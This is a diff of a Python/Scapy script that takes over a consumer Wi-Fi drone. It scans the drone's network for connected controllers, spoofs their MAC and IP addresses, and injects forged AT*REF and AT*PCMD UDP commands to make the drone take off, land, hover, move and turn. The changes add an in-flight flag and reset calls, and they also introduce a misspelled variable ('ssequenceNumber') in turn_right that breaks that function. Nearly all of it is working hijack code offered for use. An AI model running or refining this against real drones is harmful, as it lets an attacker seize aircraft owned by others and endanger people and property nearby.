@@ -11,6 +11,7 @@ srcPort = 5556
 dstPort = 5556
 dstIP = "192.168.1.1"
 sequenceNumber = 10000000000
+inFlight = True
 
 def menu():
     os.system("clear")
@@ -35,32 +36,36 @@ def menu():
     sys.stdout.write(GREEN + controler)
 
 def reset(list_of_client, dstMAC, iface):
-    global sequenceNumber
-    for i in range(5):
+    global sequenceNumber, inFlight
+    for i in range(3):
         sequenceNumber+=1
-        payload = "AT*REF="+str(1)+",290717696\r"
+        if inFlight == True:
+            payload = "AT*REF="+str(1)+",290718208\r"
+        else:
+            payload = "AT*REF="+str(1)+",290717696\r"
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
 
 def hover(list_of_client, dstMAC, iface):
     global sequenceNumber
-    for i in range(5):
+    for i in range(3):
         sequenceNumber+=1
-        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
+        payload = "AT*PCMD="+str(1)+",0,0,0,0,0\r"
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
-        sleep(0.3)
+            sleep(0.3)
 
 def take_off(list_of_client, dstMAC, iface):
     global sequenceNumber
-    for i in range(1):
+    for i in range(3):
         sequenceNumber+=1
         payload = "AT*REF="+str(sequenceNumber)+",290718208\r"
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
             sendp(spoofed_packet, iface=iface)
+        sleep(0.3)
 
 def land(list_of_client, dstMAC, iface):
     global sequenceNumber
@@ -145,7 +150,7 @@ def turn_left(list_of_client, dstMAC, iface):
 def turn_right(list_of_client, dstMAC, iface):
     global sequenceNumber
     for i in range(3):
-        sequenceNumber+=1
+        ssequenceNumber+=1
         payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,0,1050253722\r"
         for client in list_of_client:
             spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
@@ -153,6 +158,7 @@ def turn_right(list_of_client, dstMAC, iface):
         sleep(0.3)
 
 def ci_main(drone, iface):
+    global inFlight
     dstMAC = drone.bssid
     list_of_client = scanNetwork("192.168.1.2-10")  #return list of Class Object clients connected to the drone. Client define in scan_clients
     if len(list_of_client) >= 1:
@@ -162,23 +168,33 @@ def ci_main(drone, iface):
 
             if choice.upper() == 'Z':
                 front(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'S':
                 back(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'Q':
                 left(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'D':
                 right(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'I':
                 up(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'K':
                 down(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'J':
                 turn_left(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'L':
                 turn_right(list_of_client, dstMAC, iface)
+                reset(list_of_client, dstMAC, iface)
             elif choice.upper() == 'P':
+                inFlight = True
                 take_off(list_of_client, dstMAC, iface)
             elif choice.upper() == 'M':
+                inFlight = False
                 land(list_of_client, dstMAC, iface)
             elif choice == ' ':
                 reset(list_of_client, dstMAC, iface)
